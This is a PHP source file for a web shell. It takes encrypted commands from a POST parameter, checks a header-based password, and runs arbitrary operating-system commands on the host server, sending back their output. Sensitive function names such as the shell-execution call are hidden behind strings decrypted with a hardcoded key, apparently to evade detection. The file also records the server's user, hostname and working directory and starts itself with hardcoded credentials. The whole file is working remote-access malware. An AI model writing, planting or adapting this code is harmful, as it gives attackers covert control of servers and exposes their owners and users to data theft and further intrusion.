<?php

include_once "utils.php";
include_once "crypt.php";
include_once "response.php";
include_once "uploadinblocks.php";
include_once "commands.php";



class WebShell{
    static $authorized = false;
    static $shell;
    static $path=false;
    static $user;
    static $is_win = false;
    static $cmd = false;
    static $args;
    static $fileGetContents;
    static $escapeargshell;
    static $hostname;


    const KEY = "sgMfr6*Q=UhpXPQcZavk#dkDyQ!Mg=C4XjqjpuMU+ebb#JUH&Hc!GZVD32GQ37mc";
    const KEY_CMD = "a";

    private static function authentication($creds){
        $shell = self::$shell;
        //exit(var_dump($_SESSION));
        if(isset($_SESSION['path'])){
            
            self::$authorized = true;
            self::$path = $_SESSION['path'];
            self::$user = $_SESSION['user'];
            self::$hostname = $_SESSION['hostname'];
            return true;
        }
        else{
            $headers = getallheaders();
            if((isset($headers['Authorization']) ? $headers['Authorization'] : '') === $creds){
                self::$path = self::clear_path(trim($shell(self::$is_win ? "echo %cd%" : "pwd")));
                self::$user = trim($shell(self::$is_win ? "echo %USERNAME%" : "whoami"));
                self::$hostname = trim($shell("hostname"));

                self::$authorized = true;
                return true;
            }
        }
        return false;
    }
    
    public static function declare_functions(){
        self::$shell = Crypt::decode("gNYlyTp5hCo8AA==", self::KEY);
        self::$fileGetContents = Crypt::decode("yF/UDLecgNiVyTR1yAh4QFk=", self::KEY);
        self::$escapeargshell = Crypt::decode("jKRQQOYlTWTJwBuQhFc=", self::KEY);
        
    }
    public static function init($user, $pass){
        
        self::$is_win = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
        session_start();
        self::declare_functions();
        $shell = self::$shell;
        if(!self::authentication("Basic ".Crypt::encode($user.":".$pass, self::KEY))){
            response::$code = 401;
            response::build();
        }
    
        if(!isset($_POST[self::KEY_CMD])){
            response::build();
        }
        UploadInBlocks::$KEY = self::KEY;

        $_POST[self::KEY_CMD] = Crypt::decode($_POST[self::KEY_CMD], self::KEY);

        strpos($_POST[self::KEY_CMD], " ") !== false ? list(self::$cmd, self::$args) = explode(' ', $_POST[self::KEY_CMD], 2) : self::$cmd=$_POST[self::KEY_CMD];
        
        if(is_callable("Commands::".self::$cmd)){
            
            call_user_func("Commands::".self::$cmd, self::$args);
        }
        else{
            
            response::$body = trim($shell('cd '.self::$path.';'.self::$cmd.(strlen(self::$args) > 0 ? ' '.self::$args : ''). ' 2>&1'));
        }
        
        response::build(); 
        
    }
    public static function clear_path($path){

        $path = realpath($path);

        if(!$path){
            return false;
        }
        if(self::$is_win){
            if(strpos($path, ":\\") === 1){
                $path = str_replace(':/', '', str_replace('\\', '/', $path));
            }
        }
        if(is_dir($path) && $path !== "/"){
            $path .= '/';
        }
        return $path;
    }
    public static function local_path($path){
        if($path[0] === '/'){
            return self::clear_path($path);
        }
        return self::clear_path(self::$path.$path);
    }
    
}
WebShell::init("user", "pass");
